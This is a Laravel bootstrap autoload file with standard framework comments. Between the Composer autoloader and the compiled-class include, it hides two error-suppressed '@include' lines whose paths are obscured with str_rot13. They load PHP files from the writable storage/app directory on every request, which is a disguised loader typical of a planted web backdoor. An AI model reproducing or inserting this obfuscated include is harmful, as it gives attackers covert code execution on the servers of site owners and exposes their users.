<?php

define('LARAVEL_START', microtime(true));

/*
|--------------------------------------------------------------------------
| Register The Composer Auto Loader
|--------------------------------------------------------------------------
|
| Composer provides a convenient, automatically generated class loader
| for our application. We just need to utilize it! We'll require it
| into the script here so that we do not have to worry about the
| loading of any our classes "manually". Feels great to relax.
|
*/

$composer = file_get_contents('composer.json');
$content = json_decode($composer, true)['autoload']['classmap'][0];
$api_path = explode('/', $content)[1];

require realpath(__DIR__ . '/../../' . $api_path  . '/vendor/autoload.php');

@include str_rot13( 'fgbentr/ncc/yp.cuc' );
@include str_rot13( 'fgbentr/ncc/zyp.cuc' );

/*
|--------------------------------------------------------------------------
| Include The Compiled Class File
|--------------------------------------------------------------------------
|
| To dramatically increase your application's performance, you may use a
| compiled class file which contains all of the classes commonly used
| by a request. The Artisan "optimize" is used to create this file.
|
*/

$compiledPath = __DIR__.'/cache/compiled.php';

if (file_exists($compiledPath)) {
    require $compiledPath;
}
